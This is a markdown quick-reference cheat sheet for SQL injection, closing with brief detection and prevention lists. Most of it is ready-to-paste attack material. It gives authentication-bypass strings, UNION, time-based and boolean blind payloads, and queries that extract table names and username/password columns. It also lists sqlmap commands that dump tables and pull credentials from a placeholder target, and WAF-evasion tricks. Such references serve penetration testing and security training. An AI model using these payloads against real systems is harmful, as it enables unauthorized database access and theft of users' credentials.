# 💉 SQL Injection Quick Reference

## What is SQL Injection?

SQL injection is a web vulnerability that allows attackers to manipulate database queries by injecting malicious SQL code.

---

## Basic Payloads

### Authentication Bypass

```sql
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or 1=1 --
' or 1=1 --
' or 'x'='x
' or 1=1; --
```

### UNION-Based Injection

```sql
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT 1,2,3 --
' UNION SELECT username,password FROM users --
' UNION SELECT NULL,user(),version() --
```

### Time-Based Blind

```sql
' AND SLEEP(5) --
' AND BENCHMARK(10000000,SHA1('test')) --
' AND WAITFOR DELAY '00:00:05' --
' UNION SELECT SLEEP(5) --
```

### Boolean-Based Blind

```sql
' AND '1'='1
' AND '1'='2
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64 --
```

---

## Database Detection

### MySQL
```sql
' UNION SELECT VERSION() --
' AND @@version LIKE '5%' --
```

### MSSQL
```sql
' AND @@version --
' UNION SELECT @@version --
```

### Oracle
```sql
' UNION SELECT banner FROM v$version --
```

### PostgreSQL
```sql
' UNION SELECT version() --
```

---

## Common Queries

### Extract Table Names (MySQL)
```sql
' UNION SELECT table_name FROM information_schema.tables --
```

### Extract Column Names (MySQL)
```sql
' UNION SELECT column_name FROM information_schema.columns WHERE table_name='users' --
```

### Extract Data (MySQL)
```sql
' UNION SELECT username,password FROM users --
' UNION SELECT user(),database() --
```

### Extract Data (MSSQL)
```sql
' UNION SELECT name FROM sysobjects WHERE xtype='U' --
' UNION SELECT * FROM sys.tables --
```

---

## SQLMap Usage

### Basic Detection
```bash
sqlmap -u "http://target.com/page.php?id=1"
```

### List Databases
```bash
sqlmap -u "http://target.com/page.php?id=1" --dbs
```

### List Tables
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name --tables
```

### Dump Table Data
```bash
sqlmap -u "http://target.com/page.php?id=1" -D database_name -T users --dump
```

### Extract Credentials
```bash
sqlmap -u "http://target.com/page.php?id=1" --passwords
```

### POST Data
```bash
sqlmap -u "http://target.com/login" --data="username=admin&password=test"
```

### Batch Mode (No Prompts)
```bash
sqlmap -u "http://target.com/page.php?id=1" --batch
```

### Specify Risk/Level
```bash
sqlmap -u "http://target.com/page.php?id=1" --risk=3 --level=5
```

---

## Bypass Techniques

### Case Variation
```sql
SeLeCt * FrOm users
UniOn SeLeCt 1,2,3
```

### Comment Variations
```sql
-- comment
# comment
/* comment */
/*! MySQL specific */
```

### Whitespace Bypass
```sql
SELECT/**/FROM/**/users
SELECT%20FROM%20users
```

### Encoding
```sql
SELECT CHAR(102,114,111,109)
0x73656c656374
```

---

## Detection Indicators

- Single quote causes error
- AND/OR conditions change response
- Time delays occur
- Boolean responses differ
- UNION queries return data

---

## Prevention

- Use prepared statements / parameterized queries
- Input validation and sanitization
- Least privilege database accounts
- Web Application Firewall (WAF)
- Regular security testing

